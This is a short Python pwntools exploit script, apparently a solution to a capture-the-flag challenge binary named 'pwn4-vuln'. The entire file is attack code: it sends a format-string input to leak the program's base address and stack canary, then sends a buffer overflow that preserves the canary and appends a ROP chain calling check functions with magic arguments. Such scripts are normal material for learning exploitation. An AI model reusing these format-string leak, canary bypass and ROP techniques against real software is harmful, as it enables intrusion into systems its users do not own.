#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./pwn4-vuln")

context.binary = exe
offset1 = 0x1463

def main():
    r = remote(sys.argv[1], int(sys.argv[2]))
    r.sendline(b"%11$p/%15$p")
    r.readuntil(b'luck.')
    leak = r.readuntil(b'/').strip()
    value = int(str(leak)[2:-2],16) - 0x3fb4
    log.success(hex(value))
    cana = r.read().strip()
    cval = int(str(cana)[2:-1],16)
    log.success(hex(cval))
    exe.address = value
    rop = ROP(exe)
    rop.check1(0x1337)
    rop.check2(0x420)
    rop.check3(0xdeadbeef)
    rop.finalcheck(0x123)
    payload = b'A' * 32
    payload += p32(cval)
    payload += b'A' * 12
    payload += rop.chain()
    r.sendline(payload);
    print(r.recv(1024))


if __name__ == "__main__":
    main()
